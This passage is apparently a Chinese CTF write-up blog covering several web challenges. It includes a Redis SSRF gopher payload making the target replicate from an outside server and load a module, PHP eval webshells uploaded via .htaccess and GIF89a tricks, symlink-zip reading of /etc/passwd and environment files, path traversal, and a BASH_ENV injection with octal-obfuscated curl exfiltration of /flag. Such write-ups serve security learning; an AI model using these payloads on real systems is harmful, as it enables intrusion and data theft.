<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">  file_put_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>],<span class="string">&quot;&lt;?php echo &#x27;redispass is root&#x27;;exit();&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>源码给了hint，存在<code>redis</code>，那么<code>ssrf+redis</code></p>
<h5 id="redis主从复制RCE"><a href="#redis主从复制RCE" class="headerlink" title="redis主从复制RCE"></a>redis主从复制RCE</h5><p><a href="https://github.com/xmsec/redis-ssrf">https://github.com/xmsec/redis-ssrf</a></p>
<p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
<p>得先去看一下<code>redis</code>的信息，但是没有权限看，直接gopher协议打，用上面两个工具</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher%3A%2F%2F0.0.0.0%3A6379%2F_%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%25244%250D%250Aroot%250D%250A%252A3%250D%250A%25247%250D%250ASLAVEOF%250D%250A%252412%250D%250A82.156.2.166%250D%250A%25244%250D%250A6666%250D%250A%252A4%250D%250A%25246%250D%250ACONFIG%250D%250A%25243%250D%250ASET%250D%250A%25243%250D%250Adir%250D%250A%25245%250D%250A%2Ftmp%2F%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25246%250D%250Aexp.so%250D%250A%252A3%250D%250A%25246%250D%250AMODULE%250D%250A%25244%250D%250ALOAD%250D%250A%252411%250D%250A%2Ftmp%2Fexp.so%250D%250A%252A2%250D%250A%252411%250D%250Asystem.exec%250D%250A%25242%250D%250Als%250D%250A%252A1%250D%250A%25244%250D%250Aquit%250D%250A</span><br></pre></td></tr></table></figure>

<p>但是会报错找不到<code>system.exec</code>命令，说明<code>exp.so</code>文件没有被复制过去，但是我用的不是buu的靶机呀</p>
<h2 id="JMCTF-2021-UploadHub"><a href="#JMCTF-2021-UploadHub" class="headerlink" title="[JMCTF 2021]UploadHub"></a>[JMCTF 2021]UploadHub</h2><ul>
<li>php_flag engine</li>
<li>.htaccess</li>
</ul>
<p>在<code>apache2.conf</code>中设置了<code>php_flag engine off</code>，这使得不会解析php文件，所以不能直接上传php文件可以发现可以上传<code>.htaccess</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Directory ~ &quot;/var/www/html/upload/[a-f0-9]&#123;32&#125;/&quot;&gt;</span><br><span class="line">        php_flag engine off</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line">AccessFileName .htaccess</span><br></pre></td></tr></table></figure>

<h4 id="0x01-日常踩坑"><a href="#0x01-日常踩坑" class="headerlink" title="0x01:日常踩坑"></a>0x01:日常踩坑</h4><p><code>config.php</code>，过滤了$_GET数组里的单引号和双引号和一些关键字，关键字可以利用双写绕过，但是单引号和双引号不可以</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">	 <span class="variable">$value</span>= str_ireplace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$value</span>);</span><br><span class="line">	 <span class="variable">$value</span>= str_ireplace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$value</span>);</span><br><span class="line">     <span class="variable">$value</span>= str_ireplace(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$value</span>);</span><br><span class="line">     <span class="variable">$value</span>= str_ireplace(<span class="string">&#x27;select&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$value</span>);</span><br><span class="line">     <span class="variable">$value</span>= str_ireplace(<span class="string">&#x27;from&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$value</span>);</span><br><span class="line">     <span class="variable">$value</span>= str_ireplace(<span class="string">&#x27;or&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$value</span>);</span><br><span class="line">	 <span class="variable">$_GET</span>[<span class="variable">$key</span>] =<span class="variable">$value</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p><code>index.php</code>如果submit有值，也就是如果存在文件上传，就会判断文件后缀名并对文件名进行特殊符号转义，很难进行sql注入，但是或许可以利用宽字节绕过（失败</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$allow_type</span>=<span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;bmp&quot;</span>,<span class="string">&quot;tar&quot;</span>,<span class="string">&quot;zip&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span>=addslashes(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;insert into img (filename) values (&#x27;<span class="subst">$filename</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select id from img where filename=&#x27;<span class="subst">$filename</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>)</span><br></pre></td></tr></table></figure>

<h4 id="0x02-做题"><a href="#0x02-做题" class="headerlink" title="0x02:做题"></a>0x02:做题</h4><p>既然接受<code>.htaccess</code>，那就直接上传</p>
<p>因为设置了<code>php_flag engine off</code>导致不能解析php文件，但是<code>.htaccess</code>是可以重新设置的，那么就可以直接上传一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch .htaccess&gt;</span><br><span class="line">SetHandler application/x-httpd-php </span><br><span class="line">Require all granted  </span><br><span class="line">php_flag engine on	</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line">php_value auto_prepend_file .htaccess</span><br><span class="line">#&lt;?php eval($_POST[&#x27;dmind&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="HCTF-2018-Hideandseek"><a href="#HCTF-2018-Hideandseek" class="headerlink" title="[HCTF 2018]Hideandseek"></a>[HCTF 2018]Hideandseek</h2><ul>
<li>软链接任意文件读取</li>
</ul>
<p>随便登录就可以了，进去之后是一个文件上传的页面，给了hint再加上session明显就是flask_session，拿去强制解密一下可以发现会把username记录，而我们一开始登录的时候如果尝试登录admin会登不上去，说明我们要伪造admin身份，那么就是要去找一下<code>SECRET_KEY</code>了</p>
<p><img src="https://img-blog.csdnimg.cn/30636282c91747848279017b7aa22bf1.png" alt="image-20220628093422541"></p>
<p>随便压缩一个文件，上传。会发现他会自动“解析（？）”压缩文件把文件内容显示出来，说明是否可以读取任意文件</p>
<h4 id="软连接"><a href="#软连接" class="headerlink" title="软连接"></a>软连接</h4><ul>
<li>需要绝对路径</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s 源路径 目标路径</span><br></pre></td></tr></table></figure>

<p>将文件与命令文件进行软连接的时候，生成的文件是可执行的，但是这里只是获取文件内容，所以和软连接到命令文件没多大用</p>
<p><img src="https://img-blog.csdnimg.cn/3c6e1fc7e5d941ce8520182ad0a2ec1e.png" alt="image-20220628095312930"></p>
<h4 id="做题-4"><a href="#做题-4" class="headerlink" title="做题"></a>做题</h4><p>直接试一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /etc/passwd passwd</span><br><span class="line">zip --symlinks passwd.zip passwd</span><br></pre></td></tr></table></figure>

<p>上传之后可以得到文件内容，那就尝试看一下环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /proc/self/environ environ</span><br><span class="line">zip --symlinks env.zip environ</span><br></pre></td></tr></table></figure>

<p>可以知道工作目录是在<code>app</code>下，存在<code>/app/uwsgi.ini</code>等</p>
<p><img src="https://img-blog.csdnimg.cn/09cacbd28f474ac68e1b4e25df92d46a.png" alt="image-20220628100951673"></p>
<p>查看<code>uwsgi.ini</code>之后发现有日志文件，但是没有内容，就这样卡了（（</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[uwsgi] module = main callable=app logto = /tmp/hard_t0_guess_n9p2i5a6d1s_uwsgi.log</span><br></pre></td></tr></table></figure>

<p>buu（（（（</p>
<blockquote>
<p>buuoj的环境有点问题， /app/uwsgi.ini回显中应该是module=/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py，读取/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py即可得到源文件</p>
</blockquote>
<p><code>main.py</code></p>
<p>首先，<code>random.seed()</code>的作用和php的<code>mt_srand</code>作用是相同的，存在种子的时候产生的随机数其实是伪随机的</p>
<blockquote>
<p>该 **<code>uuid.getnode()</code>**函数用于获取网络接口的MAC地址。如果机器具有多个网络接口，则返回通用管理的MAC地址，而不是通过本地管理的MAC地址返回。管理的MAC地址保证是全局唯一的</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = str(random.random()*<span class="number">100</span>)</span><br></pre></td></tr></table></figure>

<p>所以要去获取MAC地址并将MAC地址转成十进制，用于生成伪随机数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /sys/class/net/eth0/address add</span><br><span class="line">zip --symlinks add.zip add</span><br></pre></td></tr></table></figure>

<p>MAC地址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c6:36:6d:36:ea:50</span><br><span class="line">&gt;&gt; 217937062849104</span><br><span class="line"></span><br><span class="line">随机数</span><br><span class="line">&gt;&gt; 30.338594317945777</span><br></pre></td></tr></table></figure>

<p>正常显示了，说明密钥是正确的，那么直接伪造</p>
<p><img src="https://img-blog.csdnimg.cn/a06b9b2844744d4ab236de7c367c6b4a.png" alt="image-20220628110926925"></p>
<p>得到flag</p>
<p><img src="https://img-blog.csdnimg.cn/15fc01cfa0d2498391aaef8067eea0e8.png" alt="image-20220628111151367"></p>
<h2 id="网鼎杯-2020-半决赛-faka"><a href="#网鼎杯-2020-半决赛-faka" class="headerlink" title="[网鼎杯 2020 半决赛]faka"></a>[网鼎杯 2020 半决赛]faka</h2><ul>
<li>thinkphp5.0.14</li>
</ul>
<h4 id="审计-2"><a href="#审计-2" class="headerlink" title="审计"></a>审计</h4><p><code>sql</code>存在admin用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO `system_user` VALUES (10005,&#x27;admin&#x27;,&#x27;81c47be5dc6110d5087dd4af8dc56552&#x27;,NULL,&#x27;12345678@qq.com&#x27;,&#x27;12345678&#x27;,&#x27;demo&#x27;,264,&#x27;2020-03-20 14:38:56&#x27;,1,&#x27;3&#x27;,0,NULL,&#x27;2018-05-02 00:40:09&#x27;,NULL);</span><br><span class="line">&gt;&gt; admin admincccbbb123</span><br></pre></td></tr></table></figure>

<p>因为是thinkphp5，试着打一下payload，不过没过</p>
<p>直接审计实在太累了，先过一下前端，存在登陆注册，注册需要邀请码但是题目已经给了直接登录就好，但是登陆页面也没有什么比较特别的内容，修改密码处看了源码之后也不存在sql注入</p>
<p>那就直接admin登录好了</p>
<p><img src="https://img-blog.csdnimg.cn/c37c46641fc74ffab0f90371918ca093.png" alt="image-20220628141428714"></p>
<h4 id="解题1"><a href="#解题1" class="headerlink" title="解题1"></a>解题1</h4><p>在备份管理处可以进行备份并存在任意文件下载，直接复制链接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://cb125922-f00c-469f-9f16-29370170d6fe.node4.buuoj.cn:81/manage/backup/downloadBak?file=test_20220628141557_429808621.sql</span><br></pre></td></tr></table></figure>

<p>特征太明显了直接下载<code>flag.txt</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://cb125922-f00c-469f-9f16-29370170d6fe.node4.buuoj.cn:81/manage/backup/downloadBak?file=../../../../flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/bb6451b6b3614b77be321e30b1b05eb0.png" alt="image-20220628150059050"></p>
<h4 id="解题2"><a href="#解题2" class="headerlink" title="解题2"></a>解题2</h4><p>存在文件上传路径</p>
<p><img src="https://img-blog.csdnimg.cn/ba8e4110425442f0b890fc743a6eb289.png" alt="image-20220628141739116"></p>
<p>先去看代码：</p>
<p><code>upload</code>函数，进行文件上传，可以上传md5来对文件路径以及文件名进行操作，然后会对文件上传进行Token验证，但是由于<code>session_id()</code>默认为空，所以会比较好验证，之后就是到<code>File</code>类中对文件上传进行处理</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">$this</span>-&gt;request-&gt;file(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">        <span class="variable">$ext</span> = strtolower(pathinfo(<span class="variable">$file</span>-&gt;getInfo(<span class="string">&#x27;name&#x27;</span>), <span class="number">4</span>)); <span class="comment">// 直接获取后缀名</span></span><br><span class="line">        <span class="variable">$md5</span> = str_split(<span class="keyword">$this</span>-&gt;request-&gt;post(<span class="string">&#x27;md5&#x27;</span>), <span class="number">16</span>); <span class="comment">// 将post传的md5的值进行16长分</span></span><br><span class="line">        <span class="variable">$filename</span> = join(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$md5</span>) . <span class="string">&quot;.<span class="subst">&#123;$ext&#125;</span>&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (strtolower(<span class="variable">$ext</span>) == <span class="string">&#x27;php&#x27;</span> || !in_array(<span class="variable">$ext</span>, explode(<span class="string">&#x27;,&#x27;</span>, strtolower(sysconf(<span class="string">&#x27;storage_local_exts&#x27;</span>))))) &#123; <span class="comment">// 后缀不能为php 如果后缀不再</span></span><br><span class="line">            <span class="keyword">return</span> json([<span class="string">&#x27;code&#x27;</span> =&gt; <span class="string">&#x27;ERROR&#x27;</span>, <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;文件上传类型受限&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 文件上传Token验证</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;request-&gt;post(<span class="string">&#x27;token&#x27;</span>) !== md5(<span class="variable">$filename</span> . session_id())) &#123;</span><br><span class="line">            <span class="keyword">return</span> json([<span class="string">&#x27;code&#x27;</span> =&gt; <span class="string">&#x27;ERROR&#x27;</span>, <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;文件上传验证失败&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 文件上传处理</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$info</span> = <span class="variable">$file</span>-&gt;move(<span class="string">&#x27;static&#x27;</span> . DS . <span class="string">&#x27;upload&#x27;</span> . DS . <span class="variable">$md5</span>[<span class="number">0</span>], <span class="variable">$md5</span>[<span class="number">1</span>], <span class="literal">true</span>))) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="variable">$site_url</span> = FileService::getFileUrl(<span class="variable">$filename</span>, <span class="string">&#x27;local&#x27;</span>))) &#123;</span><br><span class="line">                <span class="keyword">return</span> json([<span class="string">&#x27;data&#x27;</span> =&gt; [<span class="string">&#x27;site_url&#x27;</span> =&gt; <span class="variable">$site_url</span>], <span class="string">&#x27;code&#x27;</span> =&gt; <span class="string">&#x27;SUCCESS&#x27;</span>, <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;文件上传成功&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> json([<span class="string">&#x27;code&#x27;</span> =&gt; <span class="string">&#x27;ERROR&#x27;</span>, <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;文件上传失败&#x27;</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>move</code>函数前半段会对文件进行检测，检测是否合理以及图片类型等，可以用<code>GIF89a</code>绕过，然后就是对文件名进行规则检测</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$savename</span> = <span class="literal">true</span>, <span class="variable">$replace</span> = <span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment"># $path = static/upload/md5[0] $savename=md5[1]</span></span><br><span class="line">        <span class="comment">// 文件上传失败，捕获错误代码</span></span><br><span class="line">        ……</span><br><span class="line"></span><br><span class="line">        <span class="variable">$path</span> = rtrim(<span class="variable">$path</span>, DS) . DS;</span><br><span class="line">        <span class="comment">// 文件保存命名规则</span></span><br><span class="line">        <span class="variable">$saveName</span> = <span class="keyword">$this</span>-&gt;buildSaveName(<span class="variable">$savename</span>);</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable">$path</span> . <span class="variable">$saveName</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检测目录</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === <span class="keyword">$this</span>-&gt;checkPath(dirname(<span class="variable">$filename</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 不覆盖同名文件</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$replace</span> &amp;&amp; is_file(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error = [<span class="string">&#x27;has the same filename: &#123;:filename&#125;&#x27;</span>, [<span class="string">&#x27;filename&#x27;</span> =&gt; <span class="variable">$filename</span>]];</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 移动文件 */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isTest) &#123;</span><br><span class="line">            rename(<span class="keyword">$this</span>-&gt;filename, <span class="variable">$filename</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (!move_uploaded_file(<span class="keyword">$this</span>-&gt;filename, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error = <span class="string">&#x27;upload write error&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回 File 对象实例</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">new</span> <span class="built_in">self</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$file</span>-&gt;setSaveName(<span class="variable">$saveName</span>)-&gt;setUploadInfo(<span class="keyword">$this</span>-&gt;info);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在<code>buildSaveName</code>会进行判断，如果进行保存的文件名里如果不存在<code>.</code>才会将后缀名加上，那么如果我们一开始就把值给删改了，那就可以绕过了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!strpos(<span class="variable">$savename</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$savename</span> .= <span class="string">&#x27;.&#x27;</span> . pathinfo(<span class="keyword">$this</span>-&gt;getInfo(<span class="string">&#x27;name&#x27;</span>), PATHINFO_EXTENSION);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">上传文件：</span><br><span class="line">GIF89a</span><br><span class="line">&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br><span class="line">md5：</span><br><span class="line">将后四位改成`.php`</span><br></pre></td></tr></table></figure>

<h2 id="FBCTF2019-Products-Manager"><a href="#FBCTF2019-Products-Manager" class="headerlink" title="FBCTF2019]Products Manager"></a>FBCTF2019]Products Manager</h2><ul>
<li>基于约束条件的SQL注入</li>
</ul>
<p><code>www.zip</code></p>
<p>存在增加和查看<code>product</code>的功能，而在<code>db.php</code>的注释中我们可以看到表的结构以及flag在<code>facebook</code>中，并且<code>products</code>的name并没有在数据库中规定unique，而只是在后端通过查询来检测是否已经存在该行</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> products (</span><br><span class="line">  name <span class="type">char</span>(<span class="number">64</span>),</span><br><span class="line">  secret <span class="type">char</span>(<span class="number">64</span>),</span><br><span class="line">  description <span class="type">varchar</span>(<span class="number">250</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> products <span class="keyword">VALUES</span>(<span class="string">&#x27;facebook&#x27;</span>, sha256(....), <span class="string">&#x27;FLAG_HERE&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> products <span class="keyword">VALUES</span>(<span class="string">&#x27;messenger&#x27;</span>, sha256(....), ....);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> products <span class="keyword">VALUES</span>(<span class="string">&#x27;instagram&#x27;</span>, sha256(....), ....);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> products <span class="keyword">VALUES</span>(<span class="string">&#x27;whatsapp&#x27;</span>, sha256(....), ....);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> products <span class="keyword">VALUES</span>(<span class="string">&#x27;oculus-rift&#x27;</span>, sha256(....), ....);</span><br></pre></td></tr></table></figure>

<p>基于约束条件的SQL注入</p>
<p>如果我们插入的名字后面加上超过限制的空格，在插入的时候数据库就会把数据后面的空格删掉</p>
<p>使得对应的数据的<code>secret</code>被改变</p>
<p>通过查询<code>facebook</code>得到flag</p>
<h2 id="LineCTF2022-BB"><a href="#LineCTF2022-BB" class="headerlink" title="[LineCTF2022]BB"></a>[LineCTF2022]BB</h2><ul>
<li>环境变量注入</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">bye</span>(<span class="params"><span class="variable">$s</span>, <span class="variable">$ptn</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="variable">$ptn</span>, <span class="variable">$s</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_GET</span>[<span class="string">&quot;env&quot;</span>] <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(bye(<span class="variable">$k</span>, <span class="string">&quot;/=/i&quot;</span>) &amp;&amp; bye(<span class="variable">$v</span>, <span class="string">&quot;/[a-zA-Z]/i&quot;</span>)) &#123;</span><br><span class="line">            putenv(<span class="string">&quot;<span class="subst">&#123;$k&#125;</span>=<span class="subst">&#123;$v&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;imdude&#x27;&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_GET</span>[<span class="string">&quot;env&quot;</span>] <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(bye(<span class="variable">$k</span>, <span class="string">&quot;/=/i&quot;</span>)) &#123;</span><br><span class="line">            putenv(<span class="string">&quot;<span class="subst">&#123;$k&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在注入先得先要绕过<code>preg_match</code>，可以利用十六进制绕过</p>
<h4 id="十六进制绕过"><a href="#十六进制绕过" class="headerlink" title="十六进制绕过"></a>十六进制绕过</h4><p><a href="https://blog.csdn.net/RABCDXB/article/details/125351004">https://blog.csdn.net/RABCDXB/article/details/125351004</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat: $&#x27;\143\141\164&#x27; </span><br><span class="line">$&#x27;\143\141\164&#x27; poc.xml</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/3831a5523d6247899a1284b0b6e1ea34.png" alt="image-20220630101859350"></p>
<h4 id="环境变量注入"><a href="#环境变量注入" class="headerlink" title="环境变量注入"></a>环境变量注入</h4><p><a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">我是如何利用环境变量注入执行任意命令</a></p>
<p>因为没有上传点，所以也不知道该把so文件上传到哪里，所以往后看，利用<code>BASH_ENV</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;cat /flag | curl -d @- http://ip:8989/&#x27;</span></span><br><span class="line">flag = <span class="string">&quot;$&#x27;&quot;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> cmd:</span><br><span class="line">    <span class="keyword">if</span> a <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">        a = <span class="built_in">oct</span>(<span class="built_in">ord</span>(a))[<span class="number">2</span>:]</span><br><span class="line">        flag += <span class="string">&quot;\\&quot;</span> + a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += a</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># $&#x27;\143\141\164&#x27; /$&#x27;\146\154\141\147&#x27; | $&#x27;\143\165\162\154&#x27; -$&#x27;\144&#x27; @- $&#x27;\150\164\164\160&#x27;://ip:8989/</span></span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?env[BASH_ENV]=`$&#x27;\143\141\164&#x27; /$&#x27;\146\154\141\147&#x27; | $&#x27;\143\165\162\154&#x27; -$&#x27;\144&#x27; @- $&#x27;\150\164\164\160&#x27;://ip:8989/`</span><br></pre></td></tr></table></figure>



<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a></p>
<p><a href="https://blog.csdn.net/qq_51295677/article/details/124408615">[蓝帽杯 2021]One Pointer PHP</a></p>
<p><a href="https://blog.csdn.net/rfrder/article/details/121042290">利用pearcmd.php从LFI到getshell</a></p>
<p><a href="https://blog.csdn.net/weixin_43610673/article/details/122955159">https://blog.csdn.net/weixin_43610673/article/details/122955159</a></p>
<p><a href="https://xz.aliyun.com/t/10032#toc-12">https://xz.aliyun.com/t/10032#toc-12</a></p>
<p><a href="https://blog.csdn.net/SopRomeo/article/details/108967248">https://blog.csdn.net/SopRomeo/article/details/108967248</a></p>
<p><a href="https://blog.csdn.net/m0_49835838/article/details/122718372">https://blog.csdn.net/m0_49835838/article/details/122718372</a></p>
<p><a href="https://www.jianshu.com/p/73cd11d83c30">Apache POI XML外部实体（XML External Entity，XXE）攻击详解 - 简书 (jianshu.com)</a></p>
<p><a href="https://xz.aliyun.com/t/6628#toc-4">https://xz.aliyun.com/t/6628#toc-4</a></p>
<p><a href="https://blog.csdn.net/rfrder/article/details/116036092">https://blog.csdn.net/rfrder/article/details/116036092</a></p>
<p><a href="https://www.cnblogs.com/yokan/p/12650702.html">file_put_contents利用技巧(php://filter协议） - yokan - 博客园 (cnblogs.com)</a></p>
<p><a href="https://github.com/xmsec/redis-ssrf">https://github.com/xmsec/redis-ssrf</a></p>
